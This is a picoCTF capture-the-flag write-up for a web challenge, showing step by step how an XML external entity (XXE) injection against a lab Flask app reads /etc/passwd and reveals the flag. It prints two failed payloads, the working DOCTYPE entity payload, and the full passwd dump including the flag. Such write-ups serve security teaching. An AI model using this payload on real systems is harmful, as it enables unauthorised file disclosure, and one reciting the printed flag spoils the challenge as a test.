# SOAP

* Author: Geoffrey Njogu
* Location: https://play.picoctf.org/practice/challenge/376
* Tags: Web Exploitation, XXE

## Problem

> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Additional details will be available after launching your challenge instance.

The challenge came with a hint that reads "XML external entity Injection."

## Solution

I started by launching the instance associated with this challenge (Figure 1) and got the following website launched: ``http://saturn.picoctf.net:50223/`` (Figure 2). There are different education programmes listed (Figure 2) and there are three buttons that give different information about each of the programmes (Figure 3, 4) when clicked. 

After clicking on a couple of them, I went back to Burp Suite Pro and noticed that a couple of POST requests were made to the ``/data`` subdirectory. Based on the given hint and tags, I easily worked out that this required an XXE injection attack. I brushed up on this attack by looking it up and found some articles discussing it [1][2]. 

I assumed an XXE injection vulnerability vector and attempted to exploit it. I sent one of the POST requests to Burp's repeater so that I can modify its requests (Figure 6, 7). I added the following to the request to see if I can get ``/etc/passwd``:

```xml
<?xml version="1.0" encoding="UTF-8"?><data><ID>
<!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
</ID></data>
```

I sent the request and it seemed to fail:

```xml
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.10
Date: [redacted]
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
```

I tried another payload:

```
<?xml version="1.0" encoding="UTF-8"?><data><ID>2
[<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
</ID></data>
```

Another response with nothing in it was returned. After a while with experimenting with different request payloads, I finally succeeded! I used the payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```

And got:

```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.10
Date: [redacted]
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
```

The flag is: ``picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}``. 

## References

1. https://portswigger.net/web-security/xxe
2. https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
